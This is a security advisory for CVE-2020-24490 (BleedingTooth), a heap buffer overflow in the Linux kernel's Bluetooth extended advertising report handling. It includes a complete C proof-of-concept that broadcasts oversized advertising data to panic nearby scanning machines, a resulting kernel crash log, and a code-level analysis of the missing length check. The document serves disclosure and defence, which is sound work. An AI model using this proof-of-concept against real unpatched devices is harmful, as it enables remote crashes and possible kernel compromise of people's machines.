---
title: 'Linux: Heap-Based Buffer Overflow in HCI event packet parser (BleedingTooth)'
severity: Moderate
ghsa_id: GHSA-ccx2-w2r4-x649
cve_id: CVE-2020-24490
weaknesses: []
products:
- ecosystem: ''
  package_name: linux
  affected_versions: '>= 4.19'
  patched_versions: 4.19.137, 5.4.56, 5.7.13
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# BadVibes: Heap-Based Buffer Overflow (BleedingTooth)

## Summary

A heap-based buffer overflow affecting Linux kernel 4.19 and higher was discovered in `net/bluetooth/hci_event.c`.

## Severity

*Medium*

A remote attacker in short distance can broadcast extended advertising data and cause denial of service or possibly arbitrary code execution with kernel privileges on victim machines if they are equipped with Bluetooth 5 chips and are in scanning mode. Malicious or vulnerable Bluetooth chips (e.g. compromised by [BLEEDINGBIT](https://www.armis.com/bleedingbit/) or similar) can trigger the vulnerability as well.

## Proof Of Concept

*Note: Two Bluetooth 5 compatible machines are required to reproduce the results below.*

Compile the code below using `gcc -o poc poc.c -lbluetooth` and run as `sudo ./poc`. Then, enable and open the Bluetooth menu on the victims machine to start scanning. Upon reception of the extended advertising data, the kernel will dereference 4141414141414141 and panic. The following panic has been observed on Ubuntu 20.04 LTS:

   ```
   [  118.490999] general protection fault: 0000 [#1] SMP PTI
   [  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
   [  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
   [  118.491034] Workqueue: hci0 hci_rx_work [bluetooth]
   [  118.491056] RIP: 0010:hci_bdaddr_list_lookup+0x1e/0x40 [bluetooth]
   [  118.491060] Code: ff ff e9 26 ff ff ff 0f 1f 44 00 00 0f 1f 44 00 00 55 48 8b 07 48 89 e5 48 39 c7 75 0a eb 24 48 8b 00 48 39 f8 74 1c 44 8b 06 <44> 39 40 10 75 ef 44 0f b7 4e 04 66 44 39 48 14 75 e3 38 50 16 75
   [  118.491062] RSP: 0018:ffffbc6a40493c70 EFLAGS: 00010286
   [  118.491066] RAX: 4141414141414141 RBX: 000000000000001b RCX: 0000000000000000
   [  118.491068] RDX: 0000000000000000 RSI: ffff9903e76c100f RDI: ffff9904289d4b28
   [  118.491070] RBP: ffffbc6a40493c70 R08: 0000000093570362 R09: 0000000000000000
   [  118.491072] R10: 0000000000000000 R11: ffff9904344eae38 R12: ffff9904289d4000
   [  118.491074] R13: 0000000000000000 R14: 00000000ffffffa3 R15: ffff9903e76c100f
   [  118.491077] FS:  0000000000000000(0000) GS:ffff990434580000(0000) knlGS:0000000000000000
   [  118.491079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
   [  118.491081] CR2: 00007feed125a000 CR3: 00000001b860a003 CR4: 00000000003606e0
   [  118.491083] Call Trace:
   [  118.491108]  process_adv_report+0x12e/0x560 [bluetooth]
   [  118.491128]  hci_le_meta_evt+0x7b2/0xba0 [bluetooth]
   [  118.491134]  ? __wake_up_sync_key+0x1e/0x30
   [  118.491140]  ? sock_def_readable+0x40/0x70
   [  118.491143]  ? __sock_queue_rcv_skb+0x142/0x1f0
   [  118.491162]  hci_event_packet+0x1c29/0x2a90 [bluetooth]
   [  118.491186]  ? hci_send_to_monitor+0xae/0x120 [bluetooth]
   [  118.491190]  ? skb_release_all+0x26/0x30
   [  118.491207]  hci_rx_work+0x19b/0x360 [bluetooth]
   [  118.491211]  ? __schedule+0x2eb/0x740
   [  118.491217]  process_one_work+0x1eb/0x3b0
   [  118.491221]  worker_thread+0x4d/0x400
   [  118.491225]  kthread+0x104/0x140
   [  118.491229]  ? process_one_work+0x3b0/0x3b0
   [  118.491232]  ? kthread_park+0x90/0x90
   [  118.491236]  ret_from_fork+0x35/0x40
   ```

### poc.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define OCF_LE_SET_EXTENDED_ADVERTISING_PARAMETERS	0x2036
typedef struct {
	uint8_t  handle;
	uint16_t evt_properties;
	uint8_t  min_interval[3];
	uint8_t  max_interval[3];
	uint8_t  channel_map;
	uint8_t  own_addr_type;
	uint8_t  peer_addr_type;
	uint8_t  peer_addr[6];
	uint8_t  filter_policy;
	uint8_t  tx_power;
	uint8_t  primary_phy;
	uint8_t  secondary_max_skip;
	uint8_t  secondary_phy;
	uint8_t  sid;
	uint8_t  notif_enable;
} __attribute__ ((packed)) le_set_extended_advertising_parameters_cp;
#define LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE 25

#define OCF_LE_SET_EXTENDED_ADVERTISING_DATA		0x2037
typedef struct {
	uint8_t  handle;
	uint8_t  operation;
	uint8_t  fragment_preference;
	uint8_t  data_len;
	uint8_t  data[0];
} __attribute__ ((packed)) le_set_extended_advertising_data_cp;
#define LE_SET_EXTENDED_ADVERTISING_DATA_CP_SIZE 4

#define OCF_LE_SET_EXTENDED_SCAN_RESPONSE_DATA	0x2038
typedef struct {
	uint8_t  handle;
	uint8_t  operation;
	uint8_t  fragment_preference;
	uint8_t  data_len;
	uint8_t  data[0];
} __attribute__ ((packed)) le_set_extended_scan_response_data_cp;
#define LE_SET_EXTENDED_SCAN_RESPONSE_DATA_CP_SIZE 4

#define OCF_LE_SET_EXTENDED_ADVERTISE_ENABLE		0x2039
typedef struct {
	uint8_t  enable;
	uint8_t  num_of_sets;
} __attribute__ ((packed)) le_set_extended_advertise_enable_cp;
#define LE_SET_EXTENDED_ADVERTISE_ENABLE_CP_SIZE 2

typedef struct {
	uint8_t  handle;
	uint16_t duration;
	uint8_t  max_events;
} __attribute__ ((packed)) le_extended_advertising_set;
#define LE_SET_EXTENDED_ADVERTISING_SET_SIZE 4

#define OVERFLOW_SIZE 0xe5

int main(int argc, char **argv) {
  struct hci_request rq;
  uint8_t status;
  char buf[0x100];

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  le_set_extended_advertising_parameters_cp params;
  memset(&params, 0, LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE);
  params.handle = 0;
  params.evt_properties = 1;
  params.min_interval[1] = 0x8;
  params.max_interval[1] = 0x8;
  params.channel_map = 7;
  params.tx_power = 0x7f;
  params.primary_phy = 1;
  params.secondary_phy = 1;

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISING_PARAMETERS;
  rq.cparam = &params;
  rq.clen = LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Setting extended advertising parameters...\n");
  hci_send_req(hci_socket, &rq, 1000);

  le_set_extended_advertising_data_cp *adv_data = (le_set_extended_advertising_data_cp *)buf;
  adv_data->handle = 0;
  adv_data->operation = 3;
  adv_data->fragment_preference = 1;
  adv_data->data_len = OVERFLOW_SIZE;
  adv_data->data[0] = OVERFLOW_SIZE - 1;
  memset(&adv_data->data[1], 'A', OVERFLOW_SIZE - 1);

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISING_DATA;
  rq.cparam = adv_data;
  rq.clen = LE_SET_EXTENDED_ADVERTISING_DATA_CP_SIZE + OVERFLOW_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Setting extended advertising data...\n");
  hci_send_req(hci_socket, &rq, 1000);

  le_set_extended_advertise_enable_cp *enable = (le_set_extended_advertise_enable_cp *)buf;
  le_extended_advertising_set *set = (le_extended_advertising_set *)(buf + 2);
  enable->enable = 1;
  enable->num_of_sets = 1;
  set->handle = 0;
  set->duration = 0;
  set->max_events = 0;

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISE_ENABLE;
  rq.cparam = buf;
  rq.clen = LE_SET_EXTENDED_ADVERTISE_ENABLE_CP_SIZE + LE_SET_EXTENDED_ADVERTISING_SET_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Enabling extended advertising...\n");
  hci_send_req(hci_socket, &rq, 1000);

  printf("[*] Waiting for victim to scan...\n");
  sleep(60);

  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis

### Background

Bluetooth 5 standard was released back in 2016, offering *eight times broadcast messaging capacity* and more.

> Recall in Bluetooth 4.0, the advertising payload was a maximum of 31 octets. In Bluetooth 5, we’ve increased the payload to 255 octets by adding additional advertising channels and new advertising PDUs.
>
> Source: https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/

### Vulnerability

The vulnerability is

- available since [commit c215e9397b00b3045a668120ed7dbd89f2866e74](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/hci_event.c?id=c215e9397b00b3045a668120ed7dbd89f2866e74) 

- accessible since [commit b2cc9761f144e8ef714be8c590603073b80ddc13](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/hci_event.c?id=b2cc9761f144e8ef714be8c590603073b80ddc13)

These commits introduced `hci_le_ext_adv_report_evt()` to process extended advertising report events which is based on `hci_le_adv_report_evt()` for legacy advertisements.

```c
static void hci_le_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
	u8 num_reports = skb->data[0];
	void *ptr = &skb->data[1];

	hci_dev_lock(hdev);

	while (num_reports--) {
		struct hci_ev_le_advertising_info *ev = ptr;
		s8 rssi;

		if (ev->length <= HCI_MAX_AD_LENGTH) {
			rssi = ev->data[ev->length];
			process_adv_report(hdev, ev->evt_type, &ev->bdaddr,
					   ev->bdaddr_type, NULL, 0, rssi,
					   ev->data, ev->length);
		} else {
			bt_dev_err(hdev, "Dropping invalid advertising data");
		}

		ptr += sizeof(*ev) + ev->length + 1;
	}

	hci_dev_unlock(hdev);
}

...

static void hci_le_ext_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
	u8 num_reports = skb->data[0];
	void *ptr = &skb->data[1];

	hci_dev_lock(hdev);

	while (num_reports--) {
		struct hci_ev_le_ext_adv_report *ev = ptr;
		u8 legacy_evt_type;
		u16 evt_type;

		evt_type = __le16_to_cpu(ev->evt_type);
		legacy_evt_type = ext_evt_type_to_legacy(hdev, evt_type);
		if (legacy_evt_type != LE_ADV_INVALID) {
			process_adv_report(hdev, legacy_evt_type, &ev->bdaddr,
					   ev->bdaddr_type, NULL, 0, ev->rssi,
					   ev->data, ev->length);
		}

		ptr += sizeof(*ev) + ev->length;
	}

	hci_dev_unlock(hdev);
}
```

Notice that in `hci_le_adv_report_evt()`, the length `ev->length` is checked to be smaller than `HCI_MAX_AD_LENGTH`. This check is missing in `hci_le_ext_adv_report_evt()`, but that is probably intended since `ev->length` is an 8bit field and the size of the extended advertising data can only be maximal 255 bytes.

At some point in `process_adv_report()`, the data is stored using `store_pending_adv_report()` if the advertiser is doing **indirect advertisement** and the recipient is doing **active scanning**.

```c
static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
			       u8 bdaddr_type, bdaddr_t *direct_addr,
			       u8 direct_addr_type, s8 rssi, u8 *data, u8 len)
{
	struct discovery_state *d = &hdev->discovery;
	struct smp_irk *irk;
	struct hci_conn *conn;
	bool match;
	u32 flags;
	u8 *ptr, real_len;

	...

	/* Passive scanning shouldn't trigger any device found events,
	 * except for devices marked as CONN_REPORT for which we do send
	 * device found events.
	 */
	if (hdev->le_scan_type == LE_SCAN_PASSIVE) {
		...
		return;
	}

	...

	/* If there's nothing pending either store the data from this
	 * event or send an immediate device found event if the data
	 * should not be stored for later.
	 */
	if (!has_pending_adv_report(hdev)) {
		/* If the report will trigger a SCAN_REQ store it for
		 * later merging.
		 */
		if (type == LE_ADV_IND || type == LE_ADV_SCAN_IND) {
			store_pending_adv_report(hdev, bdaddr, bdaddr_type,
						 rssi, flags, data, len);
			return;
		}

		mgmt_device_found(hdev, bdaddr, LE_LINK, bdaddr_type, NULL,
				  rssi, flags, data, len, NULL, 0);
		return;
	}

	...
}
```

The `store_pending_adv_report()` subroutine copies the data into `d->last_adv_data`.

```c
static void store_pending_adv_report(struct hci_dev *hdev, bdaddr_t *bdaddr,
				     u8 bdaddr_type, s8 rssi, u32 flags,
				     u8 *data, u8 len)
{
	struct discovery_state *d = &hdev->discovery;

	bacpy(&d->last_adv_addr, bdaddr);
	d->last_adv_addr_type = bdaddr_type;
	d->last_adv_rssi = rssi;
	d->last_adv_flags = flags;
	memcpy(d->last_adv_data, data, len);
	d->last_adv_data_len = len;
}
```

Unfortunately, the size of that buffer is `HCI_MAX_AD_LENGTH=31 bytes` which is not enough to hold the extended advertising data that can be up to 255 bytes; thus leading to corruption of subsequent fields in `hci_dev`.

```c
struct hci_dev {
	...
	struct discovery_state {
		...
		u8			last_adv_data[HCI_MAX_AD_LENGTH];
		u8			last_adv_data_len;
		bool			report_invalid_rssi;
		bool			result_filtering;
		bool			limited;
		s8			rssi;
		u16			uuid_count;
		u8			(*uuids)[16];
		unsigned long		scan_start;
		unsigned long		scan_duration;
	} discovery;

	// BEGIN
	// The following fields are available since Linux kernel 5.7.
	int			discovery_old_state;
	bool			discovery_paused;
	int			advertising_old_state;
	bool			advertising_paused;

	struct notifier_block	suspend_notifier;
	struct work_struct	suspend_prepare;
	enum suspended_state	suspend_state_next;
	enum suspended_state	suspend_state;
	bool			scanning_paused;
	bool			suspended;

	wait_queue_head_t	suspend_wait_q;
	DECLARE_BITMAP(suspend_tasks, __SUSPEND_NUM_TASKS);
	// END

	struct hci_conn_hash	conn_hash;

	struct list_head	mgmt_pending;
	...
};
```